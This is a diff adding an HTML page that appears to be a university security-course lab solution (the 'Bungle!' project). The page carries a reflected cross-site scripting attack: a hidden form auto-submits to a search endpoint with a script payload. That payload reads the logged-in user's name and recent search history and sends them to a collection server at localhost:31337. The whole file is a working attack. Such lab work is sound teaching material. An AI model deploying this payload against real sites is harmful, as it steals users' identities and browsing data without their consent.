@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Bungle!</title>
+	</head>
+	<body>
+		<iframe name="xss_attack" id="xssID"></iframe>
+		<form name="xss2_0" method="get" action="https://comp427.rice.edu/proj2/search">
+			<input name="xssdefense" value="0" type="hidden">
+			<input name="q" value="<script>window.onload = function() {$.ajax({url:'https://localhost:31337/username='.concat(document.getElementById('logged-in-user').innerHTML).concat('%26last_search: ').concat(document.getElementsByClassName('list-group-item')[1].text), type:'GET'})}</script>" type="hidden">
+		</form>
+		<script>
+			document.xss2_0.submit();
+		</script>
+	</body>
+</html>
